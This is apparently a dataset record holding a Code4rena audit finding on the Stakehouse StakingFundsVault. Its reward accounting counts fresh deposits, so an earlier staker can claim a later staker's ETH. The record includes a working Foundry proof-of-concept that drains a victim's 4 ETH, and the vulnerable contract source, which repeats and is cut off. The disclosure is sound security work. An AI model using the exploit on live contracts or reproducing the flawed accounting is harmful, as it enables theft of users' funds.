{
  "Title": "[H-18] Old stakers can steal deposits of new stakers in StakingFundsVault",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L75\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L63\n\n\n# Vulnerability details\n\n## Impact\nStakers to the MEV+fees vault can steal funds from the new stakers who staked after a validator was registered and the derivatives were minted. A single staker who staked 4 ETH can steal all funds deposited by new stakers.\n## Proof of Concept\n`StakingFundsVault` is designed to pull rewards from a Syndicate contract and distributed them pro-rata among LP token holders ([StakingFundsVault.sol#L215-L231](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L215-L231)):\n```solidity\nif (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {\n    // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract\n    // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched\n    _claimFundsFromSyndicateForDistribution(\n        liquidStakingNetworkManager.syndicate(),\n        _blsPubKeys\n    );\n\n    // Distribute ETH per LP\n    updateAccumulatedETHPerLP();\n}\n\n// If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETH\nLPToken token = lpTokenForKnot[_blsPubKeys[i]];\nrequire(address(token) != address(0), \"Invalid BLS key\");\nrequire(token.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Last transfer too recent\");\n_distributeETHRewardsToUserForToken(msg.sender, address(token), token.balanceOf(msg.sender), _recipient);\n```\n\nThe `updateAccumulatedETHPerLP` function calculates the reward amount per LP token share ([SyndicateRewardsProcessor.sol#L76](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L76)):\n```solidity\nfunction _updateAccumulatedETHPerLP(uint256 _numOfShares) internal {\n    if (_numOfShares > 0) {\n        uint256 received = totalRewardsReceived();\n        uint256 unprocessed = received - totalETHSeen;\n\n        if (unprocessed > 0) {\n            emit ETHReceived(unprocessed);\n\n            // accumulated ETH per minted share is scaled to avoid precision loss. it is scaled down later\n            accumulatedETHPerLPShare += (unprocessed * PRECISION) / _numOfShares;\n\n            totalETHSeen = received;\n        }\n    }\n}\n```\n\nAnd the `_distributeETHRewardsToUserForToken` function distributes rewards to LP token holders ([SyndicateRewardsProcessor.sol#L51](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51)):\n```solidity\nfunction _distributeETHRewardsToUserForToken(\n    address _user,\n    address _token,\n    uint256 _balance,\n    address _recipient\n) internal {\n    require(_recipient != address(0), \"Zero address\");\n    uint256 balance = _balance;\n    if (balance > 0) {\n        // Calculate how much ETH rewards the address is owed / due \n        uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];\n        if (due > 0) {\n            claimed[_user][_token] = due;\n\n            totalClaimed += due;\n\n            (bool success, ) = _recipient.call{value: due}(\"\");\n            require(success, \"Failed to transfer\");\n\n            emit ETHDistributed(_user, _recipient, due);\n        }\n    }\n}\n```\n\nTo ensure that rewards are distributed fairly, these functions are called before LP token balances are updated (e.g. when making a deposit [StakingFundsVault.sol#L123](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123)).\n\nHowever, this rewards accounting algorithm also counts deposited tokens:\n1. to stake tokens, users call `depositETHForStaking` and send ETH ([StakingFundsVault.sol#L113](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L113));\n1. `updateAccumulatedETHPerLP` is called in the function ([StakingFundsVault.sol#L123](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123));\n1. `updateAccumulatedETHPerLP` checks the balance of the contract, which *already includes the new staked amount* ([SyndicateRewardsProcessor.sol#L78](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L78), [SyndicateRewardsProcessor.sol#L94](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L94)).\n1. the staked amount is then counted in the `accumulatedETHPerLPShare` variable ([SyndicateRewardsProcessor.sol#L85](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L85)), which is used to calculate the reward amount per LP share ([SyndicateRewardsProcessor.sol#L61](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61)).\n\nThis allows the following attack:\n1. a user stakes 4 ETH to a BLS key;\n1. the validator with the BLS key gets registered and its derivative tokens get minted;\n1. a new user stakes some amount to a different BLS key;\n1. the first user calls `claimRewards` and withdraws the stake of the new user.\n\n```solidity\n// test/foundry/StakingFundsVault.t.sol\nfunction testStealingOfDepositsByOldStakers_AUDIT() public {\n    // Resetting the mocks, we need real action.\n    MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 0);\n    MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyTwo, 0);\n    liquidStakingManager.setIsPartOfNetwork(blsPubKeyOne, false);\n    liquidStakingManager.setIsPartOfNetwork(blsPubKeyTwo, false);\n\n    // Aliasing accounts for better readability.\n    address nodeRunner = accountOne;\n    address alice = accountTwo;\n    address alice2 = accountFour;\n    address bob = accountThree;\n\n    // Node runner registers two BLS keys.\n    registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFive);\n    registerSingleBLSPubKey(nodeRunner, blsPubKeyTwo, accountFive);\n\n    // Alice deposits to the MEV+fees vault of the first key.\n    maxETHDeposit(alice, getBytesArrayFromBytes(blsPubKeyOne));\n\n    // Someone else deposits to the savETH vault of the first key.\n    liquidStakingManager.savETHVault().depositETHForStaking{value: 24 ether}(blsPubKeyOne, 24 ether);\n\n    // The first validator is registered and the derivatives are minted.\n    assertEq(vault.totalShares(), 0);\n    stakeAndMintDerivativesSingleKey(blsPubKeyOne);\n    assertEq(vault.totalShares(), 4 ether);\n\n    // Warping to pass the lastInteractedTimestamp checks.\n    vm.warp(block.timestamp + 1 hours);\n\n    // The first key cannot accept new deposits since the maximal amount was deposited\n    // and the validator was register. The vault however can still be used to deposit to\n    // other keys.\n\n    // Bob deposits to the MEV+fees vault of the second key.\n    maxETHDeposit(bob, getBytesArrayFromBytes(blsPubKeyTwo));\n    assertEq(address(vault).balance, 4 ether);\n    assertEq(bob.balance, 0);\n\n    // Alice is claiming rewards for the first key.\n    // Notice that no rewards were distributed to the MEV+fees vault of the first key.\n    assertEq(alice2.balance, 0);\n    vm.startPrank(alice);\n    vault.claimRewards(alice2, getBytesArrayFromBytes(blsPubKeyOne));\n    vm.stopPrank();\n\n    LPToken lpTokenBLSPubKeyOne = vault.lpTokenForKnot(blsPubKeyOne);\n\n    // Alice has stolen the Bob's deposit.\n    assertEq(alice2.balance, 4 ether);\n    assertEq(vault.claimed(alice, address(lpTokenBLSPubKeyOne)), 4 ether);\n    assertEq(vault.claimed(alice2, address(lpTokenBLSPubKeyOne)), 0);\n\n    assertEq(address(vault).balance, 0);\n    assertEq(bob.balance, 0);\n}\n```\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nConsider excluding newly staked amounts in the `accumulatedETHPerLPShare` calculations.",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-11-lsd-network-stakehouse-contest",
  "Code": [
    {
      "filename": "contracts/liquid-staking/StakingFundsVault.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nimport { Initializable } from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { ReentrancyGuard } from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\n\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\nimport { Syndicate } from \"../syndicate/Syndicate.sol\";\nimport { ETHPoolLPFactory } from \"./ETHPoolLPFactory.sol\";\nimport { LiquidStakingManager } from \"./LiquidStakingManager.sol\";\nimport { LPTokenFactory } from \"./LPTokenFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\n\n/// @title MEV and fees vault for a specified liquid staking network\ncontract StakingFundsVault is\n    Initializable, ITransferHookProcessor, StakehouseAPI, ETHPoolLPFactory, SyndicateRewardsProcessor, ReentrancyGuard\n{\n\n    /// @notice signalize that the vault received ETH\n    event ETHDeposited(address sender, uint256 amount);\n\n    /// @notice signalize ETH withdrawal from the vault\n    event ETHWithdrawn(address receiver, address admin, uint256 amount);\n\n    /// @notice signalize ERC20 token recovery by the admin\n    event ERC20Recovered(address admin, address recipient, uint256 amount);\n\n    /// @notice signalize unwrapping of WETH in the vault\n    event WETHUnwrapped(address admin, uint256 amount);\n\n    /// @notice Address of the network manager\n    LiquidStakingManager public liquidStakingNetworkManager;\n\n    /// @notice Total number of LP tokens issued in WEI\n    uint256 public totalShares;\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() initializer {}\n\n    /// @param _liquidStakingNetworkManager address of the liquid staking network manager\n    function init(address _liquidStakingNetworkManager, LPTokenFactory _lpTokenFactory) external virtual initializer {\n        _init(LiquidStakingManager(payable(_liquidStakingNetworkManager)), _lpTokenFactory);\n    }\n\n    modifier onlyManager() {\n        require(msg.sender == address(liquidStakingNetworkManager), \"Only network manager\");\n        _;\n    }\n\n    /// @notice Allows the liquid staking manager to notify funds vault about new derivatives minted to enable MEV claiming\n    function updateDerivativesMinted() external onlyManager {\n        // We know 4 ETH for the KNOT came from this vault so increase the shares to get a % of vault rewards\n        totalShares += 4 ether;\n    }\n\n    /// @notice For knots that have minted derivatives, update accumulated ETH per LP\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(totalShares);\n    }\n\n    /// @notice Batch deposit ETH for staking against multiple BLS public keys\n    /// @param _blsPublicKeyOfKnots List of BLS public keys being staked\n    /// @param _amounts Amounts of ETH being staked for each BLS public key\n    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable {\n        uint256 numOfValidators = _blsPublicKeyOfKnots.length;\n        require(numOfValidators > 0, \"Empty arrays\");\n        require(numOfValidators == _amounts.length, \"Inconsistent array lengths\");\n\n        // Update accrued ETH to contract per LP\n        updateAccumulatedETHPerLP();\n\n        uint256 totalAmount;\n        for (uint256 i; i < numOfValidators; ++i) {\n            require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, \"BLS public key is not part of LSD network\");\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnots[i]) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n                \"Lifecycle status must be one\"\n            );\n\n            LPToken tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnots[i]];\n            if (address(tokenForKnot) != address(0)) {\n                // Give anything owed to the user before making updates to user state\n                _distributeETHRewardsToUserForToken(\n                    msg.sender,\n                    address(tokenForKnot),\n                    tokenForKnot.balanceOf(msg.sender),\n                    msg.sender\n                );\n            }\n\n            uint256 amount = _amounts[i];\n            totalAmount += amount;\n\n            _depositETHForStaking(_blsPublicKeyOfKnots[i], amount, true);\n\n            // Ensure user cannot get historical rewards\n            tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnots[i]];\n            claimed[msg.sender][address(tokenForKnot)] = (tokenForKnot.balanceOf(msg.sender) * accumulatedETHPerLPShare) / PRECISION;\n        }\n\n        // Ensure that the sum of LP tokens issued equals the ETH deposited into the contract\n        require(msg.value == totalAmount, \"Invalid ETH amount attached\");\n    }\n\n    /// @notice Deposit ETH against a BLS public key for staking\n    /// @param _blsPublicKeyOfKnot BLS public key of validator registered by a node runner\n    /// @param _amount Amount of ETH being staked\n    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable returns (uint256) {\n        require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key is banned or not a part of LSD network\");\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Lifecycle status must be one\"\n        );\n\n        require(msg.value == _amount, \"Must provide correct amount of ETH\");\n\n        // Update accrued ETH to contract per LP\n        updateAccumulatedETHPerLP();\n\n        // Give anything owed to the user before making updates to user state\n        LPToken tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnot];\n        if (address(tokenForKnot) != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                msg.sender,\n                address(tokenForKnot),\n                tokenForKnot.balanceOf(msg.sender),\n                msg.sender\n            );\n        }\n\n        _depositETHForStaking(_blsPublicKeyOfKnot, _amount, true);\n\n        // Ensure user cannot get historical rewards\n        tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnot];\n        claimed[msg.sender][address(tokenForKnot)] = (tokenForKnot.balanceOf(msg.sender) * accumulatedETHPerLPShare) / PRECISION;\n\n        return _amount;\n    }\n\n    /// @notice Burn a batch of LP tokens in order to get back ETH that has not been staked by BLS public key\n    /// @param _blsPublicKeys List of BLS public keys that received ETH for staking\n    /// @param _amounts List of amounts of LP tokens being burnt\n    function burnLPTokensForETHByBLS(bytes[] calldata _blsPublicKeys, uint256[] calldata _amounts) external {\n        uint256 numOfTokens = _blsPublicKeys.length;\n        require(numOfTokens > 0, \"Empty arrays\");\n        require(numOfTokens == _amounts.length, \"Inconsistent array length\");\n        for (uint256 i; i < numOfTokens; ++i) {\n            LPToken token = lpTokenForKnot[_blsPublicKeys[i]];\n            require(address(token) != address(0), \"No ETH staked for specified BLS key\");\n            burnLPForETH(token, _amounts[i]);\n        }\n    }\n\n    /// @notice Burn a batch of LP tokens in order to get back ETH that has not been staked\n    /// @param _lpTokens Address of LP tokens being burnt\n    /// @param _amounts Amount of LP tokens being burnt\n    function burnLPTokensForETH(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external {\n        uint256 numOfTokens = _lpTokens.length;\n        require(numOfTokens > 0, \"Empty arrays\");\n        require(numOfTokens == _amounts.length, \"Inconsistent array length\");\n        for (uint256 i; i < numOfTokens; ++i) {\n            burnLPForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice For a user that has deposited ETH that has not been staked, allow them to burn LP to get ETH back\n    /// @param _lpToken Address of the LP token being burnt\n    /// @param _amount Amount of LP token being burnt\n    function burnLPForETH(LPToken _lpToken, uint256 _amount) public nonReentrant {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Amount cannot be zero\");\n        require(_amount <= _lpToken.balanceOf(msg.sender), \"Not enough balance\");\n        require(address(_lpToken) != address(0), \"Zero address specified\");\n\n        bytes memory blsPublicKeyOfKnot = KnotAssociatedWithLPToken[_lpToken];\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Cannot burn LP tokens\"\n        );\n        require(_lpToken.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Too new\");\n\n        updateAccumulatedETHPerLP();\n\n        _lpToken.burn(msg.sender, _amount);\n\n        (bool result,) = msg.sender.call{value: _amount}(\"\");\n        require(result, \"Transfer failed\");\n        emit ETHWithdrawnByDepositor(msg.sender, _amount);\n\n        emit LPTokenBurnt(blsPublicKeyOfKnot, address(_lpToken), msg.sender, _amount);\n    }\n\n    /// @notice Any LP tokens for BLS keys that have had their derivatives minted can claim ETH from the syndicate contract\n    /// @param _blsPubKeys List of BLS public keys being processed\n    function claimRewards(\n        address _recipient,\n        bytes[] calldata _blsPubKeys\n    ) external nonReentrant {\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            require(\n                liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPubKeys[i]) == false,\n                \"Unknown BLS public key\"\n            );\n\n            // Ensure that the BLS key has its derivatives minted\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPubKeys[i]) == IDataStructures.LifecycleStatus.TOKENS_MINTED,\n                \"Derivatives not minted\"\n            );\n\n            if (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {\n                // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract\n                // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched\n                _claimFundsFromSyndicateForDistribution(\n                    liquidStakingNetworkManager.syndicate(),\n                    _blsPubKeys\n                );\n\n                // Distribute ETH per LP\n                updateAccumulatedETHPerLP();\n            }\n\n            // If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETH\n            LPToken token = lpTokenForKnot[_blsPubKeys[i]];\n            require(address(token) != address(0), \"Invalid BLS key\");\n            require(token.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Last transfer too recent\");\n            _distributeETHRewardsToUserForToken(msg.sender, address(token), token.balanceOf(msg.sender), _recipient);\n        }\n    }\n\n    /// @notice function to allow admins to withdraw ETH from the vault for staking purpose\n    /// @param _wallet address of the smart wallet that receives ETH\n    /// @param _amount number of ETH withdrawn\n    /// @return number of ETH withdrawn\n    function withdrawETH(address _wallet, uint256 _amount) public onlyManager nonReentrant returns (uint256) {\n        require(_amount >= 4 ether, \"Amount cannot be less than 4 ether\");\n        require(_amount <= address(this).balance, \"Not enough ETH to withdraw\");\n        require(_wallet != address(0), \"Zero address\");\n\n        (bool result,) = _wallet.call{value: _amount}(\"\");\n        require(result, \"Transfer failed\");\n\n        emit ETHWithdrawn(_wallet, msg.sender, _amount);\n\n        return _amount;\n    }\n\n    /// @notice For any knots that are no longer part of syndicate facilitate unstaking so that knot can rage quit\n    /// @param _blsPublicKeys List of BLS public keys being processed (assuming DAO only has BLS pub keys from correct smart wallet)\n    /// @param _amounts Amounts of free floating sETH that will be unstaked\n    function unstakeSyndicateSharesForRageQuit(\n        address _sETHRecipient,\n        bytes[] calldata _blsPublicKeys,\n        uint256[] calldata _amounts\n    ) external onlyManager nonReentrant {\n        Syndicate syndicate = Syndicate(payable(liquidStakingNetworkManager.syndicate()));\n\n        _claimFundsFromSyndicateForDistribution(address(syndicate), _blsPublicKeys);\n\n        updateAccumulatedETHPerLP();\n\n        for (uint256 i; i < _blsPublicKeys.length; ++i) {\n            require(syndicate.isNoLongerPartOfSyndicate(_blsPublicKeys[i]), \"Knot is still active in syndicate\");\n        }\n\n        syndicate.unstake(address(this), _sETHRecipient, _blsPublicKeys, _amounts);\n    }\n\n    /// @notice Preview total ETH accumulated by a staking funds LP token holder associated with many KNOTs that have minted derivatives\n    function batchPreviewAccumulatedETHByBLSKeys(address _user, bytes[] calldata _blsPubKeys) external view returns (uint256) {\n        uint256 totalAccumulated;\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            LPToken token = lpTokenForKnot[_blsPubKeys[i]];\n            totalAccumulated += previewAccumulatedETH(_user, token);\n        }\n        return totalAccumulated;\n    }\n\n    /// @notice Preview total ETH accumulated by a staking funds LP token holder associated with many KNOTs that have minted derivatives\n    function batchPreviewAccumulatedETH(address _user, LPToken[] calldata _token) external view returns (uint256) {\n        uint256 totalAccumulated;\n        for (uint256 i; i < _token.length; ++i) {\n            totalAccumulated += previewAccumulatedETH(_user, _token[i]);\n        }\n        return totalAccumulated;\n    }\n\n    /// @notice Preview total ETH accumulated by a staking funds LP token holder associated with a KNOT that has minted derivatives\n    function previewAccumulatedETH(address _user, LPToken _token) public view returns (uint256) {\n        // if token maps to BLS public key that has not been minted derivatives then return zero as it's not eligible\n        bytes memory associatedBLSPublicKeyOfLpToken = KnotAssociatedWithLPToken[_token];\n        if (getAccountManager().blsPublicKeyToLifecycleStatus(associatedBLSPublicKeyOfLpToken) != IDataStructures.LifecycleStatus.TOKENS_MINTED) {\n            return 0;\n        }\n\n        // Looking at this contract balance and the ETH that is yet to be transferred from the syndicate, then tell the user how much ETH they have earned\n        address payable syndicate = payable(liquidStakingNetworkManager.syndicate());\n        return _previewAccumulatedETH(\n            _user,\n            address(_token),\n            _token.balanceOf(_user),\n            totalShares,\n            Syndicate(syndicate).previewUnclaimedETHAsFreeFloatingStaker(\n                address(this),\n                associatedBLSPublicKeyOfLpToken\n            )\n        );\n    }\n\n    /// @notice before an LP token is transferred, pay the user any unclaimed ETH rewards\n    function beforeTokenTransfer(address _from, address _to, uint256) external override {\n        address syndicate = liquidStakingNetworkManager.syndicate();\n        if (syndicate != address(0)) {\n            LPToken token = LPToken(msg.sender);\n            bytes memory blsPubKey = KnotAssociatedWithLPToken[token];\n            require(blsPubKey.length > 0, \"Invalid token\");\n\n            if (getAccountManager().blsPublicKeyToLifecycleStatus(blsPubKey) == IDataStructures.LifecycleStatus.TOKENS_MINTED) {\n                // Claim any ETH for the BLS key mapped to this token\n                bytes[] memory keys = new bytes[](1);\n                keys[0] = blsPubKey;\n                _claimFundsFromSyndicateForDistribution(syndicate, keys);\n\n                // Update the accumulated ETH per minted derivative LP share\n                updateAccumulatedETHPerLP();\n\n                // distribute any due rewards for the `from` user\n                if (_from != address(0)) {\n                    _distributeETHRewardsToUserForToken(_from, address(token), token.balanceOf(_from), _from);\n                }\n\n                // in case the new user has existing rewards - give it to them so that the after transfer hook does not wipe pending rewards\n                _distributeETHRewardsToUserForToken(_to, address(token), token.balanceOf(_to), _to);\n            }\n        }\n    }\n\n    /// @notice After an LP token is transferred, ensure that the new account cannot claim historical rewards\n    function afterTokenTransfer(address, address _to, uint256) external override {\n        if (LiquidStakingManager(payable(liquidStakingNetworkManager)).syndicate() != address(0)) {\n            LPToken token = LPToken(msg.sender);\n            require(KnotAssociatedWithLPToken[token].length > 0, \"Invalid token\");\n\n            // claim is calculated on full balance not amount being transferred so that double claims are not possible\n            claimed[_to][address(token)] = (token.balanceOf(_to) * accumulatedETHPerLPShare) / PRECISION;\n        }\n    }\n\n    /// @notice Claim ETH to this contract from the syndicate that was accrued by a list of actively staked validators\n    /// @param _blsPubKeys List of BLS public key identifiers of validators that have sETH staked in the syndicate for the vault\n    function claimFundsFromSyndicateForDistribution(bytes[] memory _blsPubKeys) external {\n        _claimFundsFromSyndicateForDistribution(liquidStakingNetworkManager.syndicate(), _blsPubKeys);\n    }\n\n    /// @dev Claim ETH from syndicate for a list of BLS public keys for later distribution amongst LPs\n    function _claimFundsFromSyndicateForDistribution(address _syndicate, bytes[] memory _blsPubKeys) internal {\n        require(_syndicate != address(0), \"Invalid configuration\");\n\n        // Claim all of the ETH due from the syndicate for the auto-staked sETH\n        Syndicate syndicateContract = Syndicate(payable(_syndicate));\n        syndicateContract.claimAsStaker(address(this), _blsPubKeys);\n\n        updateAccumulatedETHPerLP();\n    }\n\n    /// @dev Initialization logic\n    function _init(LiquidStakingManager _liquidStakingNetworkManager, LPTokenFactory _lpTokenFactory) internal virtual {\n        require(address(_liquidStakingNetworkManager) != address(0), \"Zero Address\");\n        require(address(_lpTokenFactory) != address(0), \"Zero Address\");\n\n        liquidStakingNetworkManager = _liquidStakingNetworkManager;\n        lpTokenFactory = _lpTokenFactory;\n\n        baseLPTokenName = \"ETHLPToken_\";\n        baseLPTokenSymbol = \"ETHLP_\";\n        maxStakingAmountPerValidator = 4 ether;\n    }\n}"
    },
    {
      "filename": "contracts/liquid-staking/StakingFundsVault.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nimport { Initializable } from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { ReentrancyGuard } from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\n\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\nimport { Syndicate } from \"../syndicate/Syndicate.sol\";\nimport { ETHPoolLPFactory } from \"./ETHPoolLPFactory.sol\";\nimport { LiquidStakingManager } from \"./LiquidStakingManager.sol\";\nimport { LPTokenFactory } from \"./LPTokenFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\n\n/// @title MEV and fees vault for a specified liquid staking network\ncontract StakingFundsVault is\n    Initializable, ITransferHookProcessor, StakehouseAPI, ETHPoolLPFactory, SyndicateRewardsProcessor, ReentrancyGuard\n{\n\n    /// @notice signalize that the vault received ETH\n    event ETHDeposited(address sender, uint256 amount);\n\n    /// @notice signalize ETH withdrawal from the vault\n    event ETHWithdrawn(address receiver, address admin, uint256 amount);\n\n    /// @notice signalize ERC20 token recovery by the admin\n    event ERC20Recovered(address admin, address recipient, uint256 amount);\n\n    /// @notice signalize unwrapping of WETH in the vault\n    event WETHUnwrapped(address admin, uint256 amount);\n\n    /// @notice Address of the network manager\n    LiquidStakingManager public liquidStakingNetworkManager;\n\n    /// @notice Total number of LP tokens issued in WEI\n    uint256 public totalShares;\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() initializer {}\n\n    /// @param _liquidStakingNetworkManager address of the liquid staking network manager\n    function init(address _liquidStakingNetworkManager, LPTokenFactory _lpTokenFactory) external virtual initializer {\n        _init(LiquidStakingManager(payable(_liquidStakingNetworkManager)), _lpTokenFactory);\n    }\n\n    modifier onlyManager() {\n        require(msg.sender == address(liquidStakingNetworkManager), \"Only network manager\");\n        _;\n    }\n\n    /// @notice Allows the liquid staking manager to notify funds vault about new derivatives minted to enable MEV claiming\n    function updateDerivativesMinted() external onlyManager {\n        // We know 4 ETH for the KNOT came from this vault so increase the shares to get a % of vault rewards\n        totalShares += 4 ether;\n    }\n\n    /// @notice For knots that have minted derivatives, update accumulated ETH per LP\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(totalShares);\n    }\n\n    /// @notice Batch deposit ETH for staking against multiple BLS public keys\n    /// @param _blsPublicKeyOfKnots List of BLS public keys being staked\n    /// @param _amounts Amounts of ETH being staked for each BLS public key\n    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable {\n        uint256 numOfValidators = _blsPublicKeyOfKnots.length;\n        require(numOfValidators > 0, \"Empty arrays\");\n        require(numOfValidators == _amounts.length, \"Inconsistent array lengths\");\n\n        // Update accrued ETH to contract per LP\n        updateAccumulatedETHPerLP();\n\n        uint256 totalAmount;\n        for (uint256 i; i < numOfValidators; ++i) {\n            require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, \"BLS public key is not part of LSD network\");\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnots[i]) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n                \"Lifecycle status must be one\"\n            );\n\n            LPToken tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnots[i]];\n            if (address(tokenForKnot) != address(0)) {\n                // Give anything owed to the user before making updates to user state\n                _distributeETHRewardsToUserForToken(\n                    msg.sender,\n                    address(tokenForKnot),\n                    tokenForKnot.balanceOf(msg.sender),\n                    msg.sender\n                );\n            }\n\n            uint256 amount = _amounts[i];\n            totalAmount += amount;\n\n            _depositETHForStaking(_blsPublicKeyOfKnots[i], amount, true);\n\n            // Ensure user cannot get historical rewards\n            tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnots[i]];\n            claimed[msg.sender][address(tokenForKnot)] = (tokenForKnot.balanceOf(msg.sender) * accumulatedETHPerLPShare) / PRECISION;\n        }\n\n        // Ensure that the sum of LP tokens issued equals the ETH deposited into the contract\n        require(msg.value == totalAmount, \"Invalid ETH amount attached\");\n    }\n\n    /// @notice Deposit ETH against a BLS public key for staking\n    /// @param _blsPublicKeyOfKnot BLS public key of validator registered by a node runner\n    /// @param _amount Amount of ETH being staked\n    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable returns (uint256) {\n        require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key is banned or not a part of LSD network\");\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == 